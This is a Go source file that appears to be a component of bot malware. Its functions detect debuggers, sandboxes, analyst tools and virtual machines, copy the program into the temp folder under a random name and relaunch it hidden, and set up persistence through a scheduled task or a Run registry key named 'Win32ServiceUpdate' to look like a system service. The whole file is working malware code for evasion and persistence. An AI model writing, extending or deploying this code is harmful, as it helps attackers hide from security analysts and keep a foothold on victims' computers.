package components

import (
	"log"
	"os"
	"os/exec"
	"os/user"
	"path"
	"runtime"
	"strings"
	"syscall"

	"github.com/StackExchange/wmi"
	"golang.org/x/sys/windows/registry"
)

func is_debugger_exist() bool {
	if runtime.GOOS == "windows" {
		ret, _, _ := pfnIsDebuggerPresent.Call()
		if ret != 0 {
			return true
		}

		for i := 0; i < len(debuggers); i++ {
			if find_process_by_name(debuggers[i]) {
				return true
			}
		}
	} else {
		// linux
		data, err := os.ReadFile("/proc/self/status")
		if err != nil {
			return false
		}
		lines := strings.Split(string(data), "\n")
		for _, line := range lines {
			if strings.HasPrefix(line, "TracerPid:") {
				fields := strings.Fields(line)
				if len(fields) == 2 && fields[1] != "0" {
					return true
				}
			}
		}

	}

	return false
}

func in_sandbox_now() bool {
	if runtime.GOOS == "windows" {
		// Check username
		user := os.Getenv("USERNAME")
		sandboxUsers := []string{"sandbox", "test", "malware", "analyst"}
		for _, bad := range sandboxUsers {
			if strings.Contains(strings.ToLower(user), bad) {
				return true
			}
		}
		// Check senstive process
		cmd := exec.Command("tasklist")
		out, err := cmd.Output()
		if err != nil {
			return false
		}
		sandboxProcs := []string{"vmsrvc.exe", "vmtoolsd.exe", "vboxservice.exe", "vboxtray.exe", "wireshark.exe"}
		output := strings.ToLower(string(out))
		for _, proc := range sandboxProcs {
			if strings.Contains(output, proc) {
				return true
			}
		}
	} else {
		// Linux
		u, err := user.Current()
		if err == nil {
			low := strings.ToLower(u.Username)
			return strings.Contains(low, "sandbox") || strings.Contains(low, "test") || strings.Contains(low, "malware")
		}
	}
	return false
}

func in_vm_now() bool {
	if runtime.GOOS == "windows" {
		var dst []Win32_ComputerSystem
		query := "SELECT Manufacturer, Model FROM Win32_ComputerSystem"
		wmi.Query(query, &dst)
		lower := strings.ToLower(dst[0].Manufacturer)
		vmSigns := []string{"vmware", "virtualbox", "kvm", "xen", "qemu", "hyper-v"}
		for _, s := range vmSigns {
			if strings.Contains(lower, s) {
				return true
			}
		}
	} else {
		// Linux
		data, err := os.ReadFile("/sys/class/dmi/id/product_name")
		if err != nil {
			return false
		}
		content := strings.ToLower(string(data))
		indicators := []string{"kvm", "virtualbox", "vmware", "qemu"}
		for _, key := range indicators {
			if strings.Contains(content, key) {
				return true
			}
		}
	}
	return false
}

func install_payload() {
	if runtime.GOOS == "windows" {
		if len(botcore.install_file) == 0 {
			botcore.install_file = random_string(8)
			if runtime.GOOS == "windows" {
				botcore.install_file += ".exe"
			}
		}
		temp_path := os.TempDir()
		install_path := path.Join(temp_path, botcore.install_file)
		origin_path := get_module_file()
		// Already in the installed path
		if strings.Contains(origin_path, temp_path) {
			return
		}

		if err := copy_file(origin_path, install_path); err != nil {
			log.Println("Failed to copy file to " + install_path)
			return
		}
		pfnCloseHandle.Call(botcore.sington_mutex)

		cmd := exec.Command(install_path, "-c", origin_path)
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow: true,
		}
		if err := cmd.Start(); err != nil {
			return
		}
		os.Exit(0)
	} else {
		// linux
	}
}

func startup() {
	if is_admin() {
		cmd := exec.Command(
			"schtasks",
			"/create",
			"/sc", "onlogon",
			"/tn", "Win32ServiceUpdate",
			"/tr", get_module_file(),
			"/f",
		)
		cmd.Start()
	} else {
		subPath := "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
		if reg_create_or_update_value(registry.CURRENT_USER, subPath,
			"Win32ServiceUpdate", get_module_file(), true) {
			log.Println("registry startup setting okay")
		}
	}
}
